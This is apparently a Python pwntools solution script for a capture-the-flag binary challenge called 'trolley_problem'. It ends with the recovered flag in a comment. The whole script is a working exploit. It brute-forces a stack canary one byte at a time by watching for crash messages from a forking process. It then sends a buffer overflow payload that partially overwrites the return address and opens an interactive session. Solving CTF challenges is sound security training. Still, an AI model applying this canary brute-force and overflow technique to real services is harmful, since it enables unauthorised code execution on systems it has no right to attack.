from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./src/chall', '''
    set follow-fork-mode child
    set detach-on-fork off
    b *(trolley_problem+302)
    c
''')

# p = remote('trolley-problem.harkonnen.b01lersc.tf', 8443, ssl=True)

canary_bytes = b'\x00'
print(f"Starting canary bruteforce with initial byte: {canary_bytes.hex()}")

for byte_pos in range(7):
    print(f"Bruteforcing byte position {byte_pos+1}/7...")
    for i in range(256):
        if bytes([i]) == b'\x0a':
            continue
        temp_canary_bytes = canary_bytes
        temp_canary_bytes += bytes([i])
        p.sendlineafter(b'What do you do?\n', b'A')
        p.sendlineafter(b'What do you do?\n', b'A'*0x18+temp_canary_bytes)
        if b'** stack smashing detected ***: terminated\n' not in p.recvuntil(b'Oh no!'):
            canary_bytes += bytes([i])
            print(f"Found byte \\x{i:02x} at position {byte_pos+1}")
            print(f"Current canary: {canary_bytes.hex(' ')}")
            break

canary_value = u64(canary_bytes)
print(f"Full canary value found: {hex(canary_value)}")
print("Sending final payload with return address override...")
p.sendlineafter(b'What do you do?\n', b'A'*0x18+canary_bytes+b'A'*0x8+b'\xd6')

p.interactive()

# bctf{why_c4nt_th3_tr0113y_dr1v3r_ju5t_pu11_th3_3m3rg3ncy_br4k3_5mh}